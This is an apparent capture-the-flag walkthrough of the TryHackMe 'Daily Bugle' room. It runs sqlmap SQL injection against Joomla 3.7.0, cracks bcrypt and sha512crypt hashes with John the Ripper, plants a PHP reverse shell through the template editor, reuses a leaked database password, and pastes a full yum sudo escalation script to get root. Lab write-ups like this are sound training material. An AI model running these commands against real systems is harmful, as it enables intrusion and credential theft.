# TryHackMe - [Daily Bugle](https://tryhackme.com/room/dailybugle)

"Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum."

## Task 1: Deploy

Let's start by deploying the machine and running an nmap. Since we're not really given much about this room I'm going to run a pretty aggressive scan.

```
nmap 10.10.x.x -vv -A -T4 -p- -Pn
```
* -vv Very verbose information.
* -A Enable OS detection, version detection, script scanning, and traceroute.
* -T4 Speed 1-5 selectable. I prefer 4 because 5 seems to occassionally have issues.
* -p- Run on all ports.
* -Pn ignores ping discovery.

From this scan, we can see 3 interesting ports open.

* Port 22: SSH - possible RCE if able to gain credentials.
* Port 80: Website - navigating here it appears to be a blogging site, nmap pointed it out to be Joomla.
* Port 3306: MySQL server.

**1) Access the web server, who robbed the bank?**

Looking at the blogging site and its source, we see a post about Spider-Man robbing a bank with an image. We could do some OSINT on this image with EXIF and reverse-image but it seems it is unnecessary for now.

## Task 2: Obtain user and root

We see that we can get the information for a brute-force if needed, but we know we're going to be using SQLi and that there is a MySQL server, so let's research on [SQL Injection](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#MySQLIf).

Now let's look into [Joomla](https://www.joomla.org/).

**1) What is the Joomla version?**

It appears on github there is a [vulnerability scanner](https://github.com/OWASP/joomscan) made just for Joomla, perfect. 

Let's run this scanner on the site and see what we get.

```
joomscan -u http://10.10.234.214

[+] Detecting Joomla Version                                             
[++] Joomla 3.7.0 

[+] admin finder                                                         
[++] Admin page : http://10.10.234.214/administrator/  
```

Cool, we can see now that it is Joomla (3.7.0).

Toss the version into searchsploit or check [Exploit-DB](https://www.exploit-db.com/) and cross your fingers!

We're in luck, there appears to be several SQL injection exploits for 3.7.0 with com_fields using [CVE-2017-8917](https://nvd.nist.gov/vuln/detail/CVE-2017-8917).

[Reading](https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html) on the exploit.

**2) What is Jonah's cracked password?**

TryHackMe says to attempt this without SQLMap, so I will be using [Joomblah.py](https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py).

```
python joomblah.py http://10.10.234.214
```

Success! I want to try it with sqlmap too, though.

First, let's read the [exploit](https://www.exploit-db.com/exploits/42033) script and launch the command described using [sqlmap](https://github.com/sqlmapproject/sqlmap) to enumerate the databases.

```
sqlmap -u "http://10.10.234.214/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

Enumeration lets us know that there are user credentials that we may be able to get for Joomla.

Run SQLmap to try and dump the credentials.

```
sqlmap -u "http://10.10.123.253/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' --dump
```

Unfortunately, it's not able to retrieve the column names. So we will have to use a wordlist.

I am going to be using one that comes with sqlmap, **/usr/share/sqlmap/data/txt/common-columns.txt**.

### Success!! We managed to get the id, name, email, and password hash of Super User Jonah.

However, I'm unsure what kind of hash this is so let's do some research by looking into the start of the hash, **$2y$**.

We can find that this hash is [bcrypt](https://auth0.com/blog/hashing-in-action-understanding-bcrypt/).

Worth noting that [hashid](https://github.com/psypanda/hashID) can be used to help identify the hash but does not pinpoint it exactly.

There are multiple hash crackers we could use here but I will be using [John the Ripper](https://github.com/openwall/john).

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
```

Awesome, the rockyou.txt and john were able to easily crack the super secure **spiderman123** password!

**3) What is the user flag?**

Let's take a shot in the dark real quick and see if root has the same password as the Joomla user (Jonah) we found.

No luck, so we'll be moving on. Since we have a super user, let's navigate to the administrator directory that joomscan found earlier (http://10.10.x.x/administrator/) and see what privileges we have.

It looks like we can do Extensions> Templates > Templates and edit the Protostar Details and Files > index.php.

* Create a new php file, name it something like errorEN.php to hide it.
* Put in the php reverse shell code and save.
* Setup reverse shell with correct port and openVPN tun0-IP.
* Make a netcat listener on port 6666 and execute a url-encoded reverse shell.

```
rlwrap nc -lvnp 6666
```

* Navigate to the shell you created.

```   
listening on [any] 6666 ...
connect to [Tun0-IP] from (UNKNOWN) [10.10.234.214] 51230
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 13:02:16 up 49 min,  0 users,  load average: 0.00, 0.01, 0.20
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ 
```

**4) What is the root flag?**

Now that we have a shell, let's go ahead and search the directory we are in for any information.

First, we want to run a whoami and check for any users in home. We can see jjameson exists.

We see a configuration.php file in **/var/www/html**.

```
sh-4.2$ cat configuration.php
cat configuration.php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'The Daily Bugle';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'nv5uz9r3ZEDzVjNu';
        public $db = 'joomla';
        public $dbprefix = 'fb9j5_';
        public $live_site = '';
        public $secret = 'UAMBRWzHO3oFPmVC';
        public $gzip = '0';
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
        public $ftp_host = '127.0.0.1';
        public $ftp_port = '21';
        public $ftp_user = '';
        public $ftp_pass = '';
        public $ftp_root = '';
        public $ftp_enable = '0';
        public $offset = 'UTC';
        public $mailonline = '1';
        public $mailer = 'mail';
        public $mailfrom = 'jonah@tryhackme.com';
        public $fromname = 'The Daily Bugle';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = '0';
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = '25';
        public $caching = '0';
        public $cache_handler = 'file';
        public $cachetime = '15';
        public $cache_platformprefix = '0';
        public $MetaDesc = 'New York City tabloid newspaper';
        public $MetaKeys = '';
        public $MetaTitle = '1';
        public $MetaAuthor = '1';
        public $MetaVersion = '0';
        public $robots = '';
        public $sef = '1';
        public $sef_rewrite = '0';
        public $sef_suffix = '0';
        public $unicodeslugs = '0';
        public $feed_limit = '10';
        public $feed_email = 'none';
        public $log_path = '/var/www/html/administrator/logs';
        public $tmp_path = '/var/www/html/tmp';
        public $lifetime = '15';
        public $session_handler = 'database';
        public $shared_session = '0';

```

Looks like the root password is in it for Joomla, but will it work for ssh? 

If it does, we can use the root account to get both the user and root flags.

We can attempt to get a more stable **secure shell (SSH)**.

Unfortunately it looks like the password does not work for root.

```
ssh root@10.10.234.214
```

So let's try it on the user we found, jjameson, to see if the password works.

### Success! We've got access to a user. Time for some privilege escalation.

Let's go through and try to escalate privileges with yum from our user account.

Run sudo -l to see if jjameson can run yum on dailybugle.

```
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid,
    always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY
    HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
    USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

Since jjameson has privileges for yum, we will be using a known custom plugin for [escalation](https://gtfobins.github.io/gtfobins/yum/) to a root shell.

* Copy and paste the example into the shell to escalate

```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

* Grab the root flag, you're root :)

```
sh-4.2# ls
bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
boot  etc  lib   media  opt  root  sbin  sys  usr
sh-4.2# cd root
sh-4.2# ls
anaconda-ks.cfg  root.txt
sh-4.2# cat root.txt
```

If you wanted to get the root password, you can cat the anaconda-ks.cfg file to get the hash.

It starts with $6$ so I will be using John the Ripper with sha512crypt format.

```
john "root hash.txt" --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cap123           (?)
1g 0:00:01:10 DONE (2021-03-12 13:42) 0.01422g/s 1529p/s 1529c/s 1529C/s carlosmiguel..barsha
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## Task 3: Credits

"Found another way to compromise the machine or want to assist others in rooting it? Keep an eye on the forum post located [here](https://tryhackme.com/thread/5e1ef29a2eda9b0f20b151fd)."

### Congratulations! You're done with the room!

## Mitigations

### Initial Access

### Privilege Escalation

Feel free to reach out to me on [Twitter](https://twitter.com/R_G_9_n) if you have any questions.
